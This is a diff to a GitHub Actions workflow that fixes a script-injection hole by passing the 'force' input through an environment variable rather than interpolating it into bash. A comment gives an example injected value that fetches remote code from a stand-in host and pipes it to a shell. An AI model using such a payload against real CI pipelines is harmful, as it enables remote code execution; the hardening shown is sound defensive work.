@@ -51,11 +51,15 @@ jobs:
           fetch-tags: true
       - id: check
         shell: bash
+        # Via env, not ${{ }}: an interpolation is substituted before bash parses
+        # the line, so a `force` of `x" ]; curl evil|sh; [ "` would execute here.
+        env:
+          FORCE: ${{ github.event.inputs.force }}
         run: |
           set -euo pipefail
           last=$(git rev-parse -q --verify "refs/tags/nightly^{commit}" || echo none)
           head=$(git rev-parse HEAD)
-          if [ "$last" = "$head" ] && [ "${{ github.event.inputs.force }}" != "true" ]; then
+          if [ "$last" = "$head" ] && [ "$FORCE" != "true" ]; then
             echo "main is unchanged since the last nightly ($head); skipping."
             echo "build=false" >> "$GITHUB_OUTPUT"
           else
